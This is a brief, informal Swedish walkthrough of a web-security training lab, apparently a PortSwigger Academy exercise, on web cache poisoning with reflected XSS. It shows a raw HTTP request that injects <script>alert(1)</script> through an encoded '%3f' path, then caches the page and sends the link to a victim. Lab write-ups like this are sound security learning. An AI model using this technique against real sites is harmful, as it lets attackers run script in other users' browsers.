
du måste skicka requesten med burp annars kommer browser url encoda. 
byt frågetecknet från `?` till `%3f` på en request. responsen kommer visa *unga bunga*. du kommer kunna injecta xss. Du kommer inte kunna köra en `<img>` div pga mellanrum. kanske med url encodad mellanslag??? inte testat. sa fuck it och smällde in script ist. 
se till att cacha unga bunga med xss och besök sidan, alert(1) poppar.
Cacha sidan igen och skicka länk till victim. Ez money.

```
GET /post%3fpostId=1<script>alert(1)</script> HTTP/2
Host: 0a9100da0474f5da8486404400d900af.web-security-academy.net
Cookie: session=NmSdiGQJsebsRnfaSQVk5hQyR6R0k13u
Sec-Ch-Ua: "Chromium";v="129", "Not=A?Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a9100da0474f5da8486404400d900af.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```
